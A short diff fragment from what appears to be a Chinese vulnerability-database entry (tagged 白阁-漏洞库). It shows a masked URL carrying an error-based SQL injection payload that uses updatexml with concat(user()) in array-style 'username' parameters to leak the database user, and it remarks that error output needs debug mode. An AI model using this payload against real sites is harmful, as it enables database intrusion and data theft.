@@ -13,4 +13,4 @@ tags: ['白阁-漏洞库']
 
 没开启debug看不到报错信息```
 http://********/index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0 
-```
+
